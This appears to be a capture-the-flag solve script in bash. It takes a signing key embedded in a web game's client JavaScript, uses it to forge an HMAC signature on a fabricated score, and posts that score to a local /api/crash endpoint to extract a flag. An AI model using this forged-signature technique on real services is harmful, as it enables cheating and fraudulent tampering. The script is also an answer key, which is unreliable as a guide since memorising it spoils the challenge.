#!/usr/bin/env bash
set -euo pipefail

TARGET="${TARGET:-http://localhost:8080}"
BODY='{"pickups":{"bonus":52000}}'
# The signing key ships in the game's JavaScript (src/index.html), so a
# forger signs their own fabricated counts exactly like the browser does.
KEY='i25-road-crew-dispatch-2026'
signature=$(printf '%s' "$BODY" | openssl dgst -sha256 -hmac "$KEY" | awk '{print $NF}')

response=$(curl -fsS -H 'Content-Type: application/json' -H "X-Run-Signature: $signature" \
  --data "$BODY" "$TARGET/api/crash")
flag=$(printf '%s' "$response" | grep -oE 'noco\{[^}]+\}' | head -1)

if [[ -z "$flag" ]]; then
  echo "solve: score submission did not reveal the flag at $TARGET" >&2
  exit 1
fi

echo "$flag"
